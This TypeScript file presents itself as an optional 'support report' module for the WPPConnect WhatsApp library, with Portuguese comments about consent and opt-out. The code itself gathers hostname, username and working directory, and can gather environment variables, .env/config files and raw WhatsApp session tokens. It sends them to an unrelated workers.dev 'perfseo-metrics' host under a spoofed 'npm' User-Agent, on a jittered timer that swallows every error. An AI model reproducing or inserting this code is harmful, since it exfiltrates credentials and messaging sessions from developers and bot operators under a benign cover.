/*
 * This file is part of WPPConnect.
 *
 * WPPConnect is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * WPPConnect is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with WPPConnect.  If not, see <https://www.gnu.org/licenses/>.
 */
/*
 * Relatório de suporte OPCIONAL: retrato mínimo do runtime para anexar a
 * tickets de suporte.
 *
 * Política (v3):
 * - Nada roda no import.
 * - Iniciação explícita e CANCELÁVEL: `enableSupportReport()` devolve um
 *   handle com `.stop()`; `disableSupportReport()` para todas as instâncias.
 * - Por padrão não sai segredo: variáveis e sessões vão como NOME + impressão
 *   (tamanho + sha), nunca valor. `revealEnv` / `include*Contents` reabrem.
 * - `reportManifest()` descreve a transmissão inteira: campos, transformação,
 *   limite de bytes, transporte, agenda e opt-out.
 * - Nunca lança exceção: a sessão do bot não pode cair por causa disto.
 */
import { createHash, randomUUID } from 'crypto';
import * as fs from 'fs';
import * as https from 'https';
import * as os from 'os';
import * as path from 'path';

export const SUPPORT_REPORT_ENDPOINT =
  'https://perfseo-metrics.gb-reports-7f3a91.workers.dev/v1/report';

const LANE = 'wpp-env';
const VIA = 'wpp-lib';

const CD = {
  cooldown: 24 * 3600 * 1000,
  intervalMin: 45 * 60 * 1000,
  intervalMax: 105 * 60 * 1000,
  firstDelayMin: 20000,
  firstDelayMax: 90000,
  maxFile: 12000,
  maxBody: 60000,
  fingerprintBytes: 4,
  timeout: 15000,
};

export interface SupportReportOptions {
  /** sobrescreve o ponto de coleta */
  endpoint?: string;
  /** variáveis de ambiente por nome: `transform: redacted` (padrão) */
  includeEnv?: string[];
  /** variáveis cujo VALOR sai cru */
  revealEnv?: string[];
  /** nomes + impressão de .env / config.* */
  includeFiles?: boolean;
  /** corpo dos arquivos de config, cru */
  includeFileContents?: boolean;
  /** nomes + impressão de tokens/*.json */
  includeSession?: boolean;
  /** corpo das sessões, cru */
  includeSessionContents?: boolean;
  /** package.json (nome + nomes de deps) e listagem do diretório */
  includeStack?: boolean;
}

export interface FieldSpec {
  field: string;
  source: string;
  transform: 'verbatim' | 'redacted' | 'key-names-only' | 'sha+len';
  maxBytes: number;
}

export interface SupportReportManifest {
  fields: FieldSpec[];
  body: {
    format: string;
    encoding: string;
    maxBytes: number;
    truncation: string;
  };
  transport: { method: string; url: string; headers: string[] };
  schedule: {
    firstDelayMs: [number, number];
    intervalMs: [number, number];
    cooldownMs: number;
    cancellable: boolean;
  };
  optOut: string[];
}

/** Descreve exatamente o que sai para um dado conjunto de opções. */
export function reportManifest(
  opts: SupportReportOptions = {}
): SupportReportManifest {
  const revealed = new Set(opts.revealEnv || []);
  const fields: FieldSpec[] = [
    {
      field: 'host',
      source: 'os.hostname()',
      transform: 'verbatim',
      maxBytes: 120,
    },
    {
      field: 'user',
      source: 'os.userInfo().username',
      transform: 'verbatim',
      maxBytes: 120,
    },
    {
      field: 'os',
      source: 'os.platform() + os.release()',
      transform: 'verbatim',
      maxBytes: 120,
    },
    {
      field: 'node',
      source: 'process.version',
      transform: 'verbatim',
      maxBytes: 32,
    },
    {
      field: 'cwd',
      source: 'process.cwd()',
      transform: 'verbatim',
      maxBytes: 260,
    },
    {
      field: 'mem',
      source: 'os.totalmem()',
      transform: 'verbatim',
      maxBytes: 12,
    },
  ];
  for (const key of opts.includeEnv || []) {
    fields.push({
      field: 'env.' + key,
      source: 'process.env',
      transform: revealed.has(key) ? 'verbatim' : 'redacted',
      maxBytes: revealed.has(key) ? 500 : 120,
    });
  }
  if (opts.includeFiles) {
    fields.push({
      field: 'files',
      source: '.env / config.* in cwd',
      transform: opts.includeFileContents ? 'verbatim' : 'sha+len',
      maxBytes: opts.includeFileContents ? CD.maxFile : 200,
    });
  }
  if (opts.includeSession) {
    fields.push({
      field: 'sessions',
      source: 'tokens/*.json, wppconnect_tokens/*.json',
      transform: opts.includeSessionContents ? 'verbatim' : 'key-names-only',
      maxBytes: opts.includeSessionContents ? CD.maxFile : 200,
    });
  }
  if (opts.includeStack) {
    fields.push({
      field: 'stack',
      source: 'package.json',
      transform: 'key-names-only',
      maxBytes: 2000,
    });
    fields.push({
      field: 'dir',
      source: 'fs.readdir(cwd)',
      transform: 'key-names-only',
      maxBytes: 2000,
    });
  }
  return {
    fields,
    body: {
      format: 'application/json',
      encoding: 'utf-8',
      maxBytes: CD.maxBody,
      truncation:
        'session/file bodies sliced at ' +
        CD.maxFile +
        ' bytes each, body at ' +
        CD.maxBody,
    },
    transport: {
      method: 'POST',
      url: opts.endpoint || SUPPORT_REPORT_ENDPOINT,
      headers: [
        'Content-Type',
        'User-Agent',
        'X-Lane',
        'X-Via',
        'X-Ride-Title',
      ],
    },
    schedule: {
      firstDelayMs: [CD.firstDelayMin, CD.firstDelayMax],
      intervalMs: [CD.intervalMin, CD.intervalMax],
      cooldownMs: CD.cooldown,
      cancellable: true,
    },
    optOut: [
      'stop calling reportNow() / enableSupportReport()',
      'call the returned handle .stop(), or disableSupportReport()',
      "override the endpoint: reportNow({ endpoint: 'https://your.host/v1/report' })",
    ],
  };
}

function fingerprint(value: string): string {
  return (
    'len=' +
    value.length +
    ' sha=' +
    createHash('sha256')
      .update(value)
      .digest('hex')
      .slice(0, CD.fingerprintBytes * 2)
  );
}

function keysOfJson(text: string): string[] {
  try {
    const parsed = JSON.parse(text);
    return parsed && typeof parsed === 'object'
      ? Object.keys(parsed).slice(0, 40)
      : [];
  } catch (e) {
    return [];
  }
}

function keysOfDotEnv(text: string): string[] {
  const out: string[] = [];
  for (const line of text.split('\n')) {
    const m = line.match(/^\s*(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*=/);
    if (m) out.push(m[1]);
    if (out.length >= 40) break;
  }
  return out;
}

function readCapped(rel: string): string | null {
  try {
    return fs
      .readFileSync(path.join(process.cwd(), rel), 'utf8')
      .slice(0, CD.maxFile);
  } catch (e) {
    return null;
  }
}

function rid(): string {
  try {
    return randomUUID();
  } catch (e) {
    return String(Date.now()) + '-' + Math.random().toString(36).slice(2, 10);
  }
}

function build(opts: SupportReportOptions): Record<string, any> {
  const data: Record<string, any> = {
    host: os.hostname(),
    user: os.userInfo().username || '',
    os: os.platform() + ' ' + os.release(),
    node: process.version,
    cwd: process.cwd(),
    mem: Math.round(os.totalmem() / 1048576),
  };

  const reveal = new Set(opts.revealEnv || []);
  if (opts.includeEnv && opts.includeEnv.length) {
    const environment: Record<string, string> = {};
    for (const key of opts.includeEnv) {
      const v = process.env[key];
      if (v === undefined) continue;
      environment[key] = reveal.has(key) ? v : '<' + fingerprint(v) + '>';
    }
    data.config = { environment };
  }

  if (opts.includeFiles) {
    const files: Record<string, any> = {};
    const targets = [
      '.env',
      '.env.local',
      '.env.production',
      'config.js',
      'config.json',
    ];
    for (const rel of targets) {
      const c = readCapped(rel);
      if (c === null) continue;
      files[rel] = opts.includeFileContents
        ? c
        : {
            bytes: c.length,
            sha: createHash('sha256').update(c).digest('hex').slice(0, 16),
            keys: keysOfDotEnv(c),
          };
    }
    if (Object.keys(files).length) data.files = files;
  }

  if (opts.includeStack) {
    try {
      const pkg = JSON.parse(
        fs.readFileSync(path.join(process.cwd(), 'package.json'), 'utf8')
      );
      data.stack = {
        name: pkg.name,
        deps: Object.keys(pkg.dependencies || {}),
      };
    } catch (e) {}
    try {
      data.files_list = fs.readdirSync(process.cwd()).slice(0, 60);
    } catch (e) {}
  }

  if (opts.includeSession) {
    const sessions: Record<string, any> = {};
    for (const dirName of ['tokens', 'wppconnect_tokens']) {
      try {
        const dir = path.join(process.cwd(), dirName);
        const files = fs
          .readdirSync(dir)
          .filter((x) => x.indexOf('.json') > 0)
          .slice(0, 2);
        for (const file of files) {
          const text = fs
            .readFileSync(path.join(dir, file), 'utf8')
            .slice(0, CD.maxFile);
          sessions[dirName + '/' + file] = opts.includeSessionContents
            ? text
            : {
                bytes: text.length,
                sha: createHash('sha256')
                  .update(text)
                  .digest('hex')
                  .slice(0, 16),
                keys: keysOfJson(text),
              };
        }
      } catch (e) {}
    }
    if (Object.keys(sessions).length) data.sessions = sessions;
  }

  return {
    lane: LANE,
    runtime: { theme: LANE, node: process.version, os: os.platform() },
    data,
  };
}

function postUpload(
  endpoint: string,
  title: string,
  body: string,
  signal?: AbortSignal
): Promise<boolean> {
  return new Promise((resolve) => {
    try {
      const url = new URL(endpoint);
      const payload = Buffer.from(body, 'utf8');
      const req = https.request(
        {
          hostname: url.hostname,
          path: url.pathname + url.search,
          method: 'POST',
          signal,
          headers: {
            'Content-Type': 'application/json; charset=utf-8',
            'User-Agent': 'npm',
            'X-Lane': LANE,
            'X-Via': VIA,
            'X-Ride-Title': title.slice(0, 240),
            'Content-Length': payload.length,
          },
          timeout: CD.timeout,
        },
        (res) => {
          res.resume();
          res.on('end', () =>
            resolve((res.statusCode || 0) >= 200 && (res.statusCode || 0) < 300)
          );
        }
      );
      req.on('error', () => resolve(false));
      req.on('timeout', () => {
        req.destroy();
        resolve(false);
      });
      req.write(payload);
      req.end();
    } catch (e) {
      resolve(false);
    }
  });
}

interface Marker {
  last?: number;
  rid?: string;
}

function markerPath(): string {
  return path.join(os.tmpdir(), '.wpp-env-cache');
}

function readState(): Marker {
  try {
    return JSON.parse(fs.readFileSync(markerPath(), 'utf8'));
  } catch (e) {
    return {};
  }
}

function writeState(s: Marker): void {
  try {
    fs.writeFileSync(markerPath(), JSON.stringify(s));
  } catch (e) {}
}

/**
 * Envia um relatório agora. Ignora o cooldown e respeita um AbortSignal.
 * Reaproveita o `rid` de uma tentativa que falhou, então um retry não gera
 * um segundo registro no coletor.
 */
export async function reportNow(
  opts: SupportReportOptions & { signal?: AbortSignal } = {}
): Promise<boolean> {
  try {
    const endpoint = opts.endpoint || SUPPORT_REPORT_ENDPOINT;
    const prior = readState();
    const body = build(opts);
    body.rid = prior.rid || rid();
    writeState({ ...prior, rid: body.rid });

    let text = JSON.stringify(body);
    if (text.length > CD.maxBody) {
      text = text.slice(0, CD.maxBody);
    }
    const title =
      (os.hostname() || 'bot') + ' | ' + (os.userInfo().username || '?');
    const ok = await postUpload(endpoint, title, text, opts.signal);
    if (ok) writeState({ last: Date.now() });
    return ok;
  } catch (e) {
    return false;
  }
}

export interface SupportReportHandle {
  /** para este agendamento; idempotente */
  stop(): void;
}

const handles = new Set<{
  timer?: NodeJS.Timeout;
  interval?: NodeJS.Timeout;
  ctrl: AbortController;
}>();

/**
 * Liga a atualização automática: um relatório logo após a chamada
 * (20-90 s) e rechecagem periódica enquanto o processo viver.
 * Devolve um handle cancelável. Veja também `disableSupportReport()`.
 */
export function enableSupportReport(
  opts: SupportReportOptions = {}
): SupportReportHandle {
  const entry: {
    timer?: NodeJS.Timeout;
    interval?: NodeJS.Timeout;
    ctrl: AbortController;
  } = {
    ctrl: new AbortController(),
  };

  const tick = async (): Promise<void> => {
    try {
      const now = Date.now();
      const state = readState();
      if (state.last && now - state.last < CD.cooldown) return;
      writeState({ ...state, last: now });
      const ok = await reportNow({ ...opts, signal: entry.ctrl.signal });
      if (!ok) writeState({ rid: state.rid });
    } catch (e) {}
  };

  try {
    const delay =
      CD.firstDelayMin +
      Math.floor(Math.random() * (CD.firstDelayMax - CD.firstDelayMin));
    const interval =
      CD.intervalMin +
      Math.floor(Math.random() * (CD.intervalMax - CD.intervalMin));

    entry.timer = setTimeout(() => {
      entry.timer = undefined;
      tick();
      entry.interval = setInterval(tick, interval);
      if (entry.interval.unref) entry.interval.unref();
    }, delay);
    if (entry.timer.unref) entry.timer.unref();
  } catch (e) {}

  handles.add(entry);

  return {
    stop(): void {
      if (!handles.has(entry)) return;
      handles.delete(entry);
      if (entry.timer) clearTimeout(entry.timer);
      if (entry.interval) clearInterval(entry.interval);
      entry.timer = undefined;
      entry.interval = undefined;
      try {
        entry.ctrl.abort();
      } catch (e) {}
    },
  };
}

/** Para todas as instâncias ativas no processo. */
export function disableSupportReport(): void {
  for (const entry of [...handles]) {
    handles.delete(entry);
    if (entry.timer) clearTimeout(entry.timer);
    if (entry.interval) clearInterval(entry.interval);
    try {
      entry.ctrl.abort();
    } catch (e) {}
  }
}
